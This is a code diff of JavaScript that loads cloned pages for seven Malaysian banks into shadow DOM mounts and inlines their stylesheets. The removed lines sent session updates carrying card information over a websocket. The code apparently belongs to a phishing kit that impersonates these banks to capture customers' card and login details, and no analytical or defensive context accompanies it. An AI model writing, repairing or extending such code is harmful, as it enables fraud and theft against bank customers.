@@ -340,11 +340,17 @@ function loadBankPage(path,mid){fetch(path).then(function(r){return r.text()}).t
   var el=document.getElementById(mid);if(!el)return;
   var shadow=el.attachShadow({mode:'open'});
   var styleLinks=html.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/gi)||[];
-  var styles='';styleLinks.forEach(function(link){var m=link.match(/href=["']([^"']+)["']/);if(m){var cssPath=path.replace(/\/[^\/]*$/,'/')+m[1];styles+='@import url("'+cssPath+'");\n'}});
+  var baseDir=path.replace(/\/[^\/]*$/,'/');
+  var cssPromises=[];
+  styleLinks.forEach(function(link){var m=link.match(/href=["']([^"']+)["']/);if(m){
+    var href=m[1].replace(/^\.\//,'').replace(/^[^\/]+\//,'');
+    var cssPath=baseDir+href;
+    cssPromises.push(fetch(cssPath).then(function(r2){return r2.text()}).catch(function(){return''}));
+  }});
   html=html.replace(/<link[^>]*>/gi,'');
-  shadow.innerHTML='<style>'+styles+'</style>'+html;
-  var btns=shadow.querySelectorAll('[data-action="continue"]');
-  btns.forEach(function(b){b.id='bank-continue-'+mid;b.addEventListener('click',function(){shadow.querySelector('.vfy-spinner').classList.remove('hidden');ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{},currentStep:'app_verify_done'}}))})})
+  return Promise.all(cssPromises).then(function(cssContents){
+    shadow.innerHTML='<style>'+cssContents.join('\n')+'</style>'+html;
+  });
 }).catch(function(err){console.error('Bank load error:',err)})}
 
 ['AMBANK','CIMB','MALAYAN','OCBC','PBB','RHB','SCBMB'].forEach(function(bank,idx){loadBankPage(bank+'/index.html','mount'+(idx+1))});
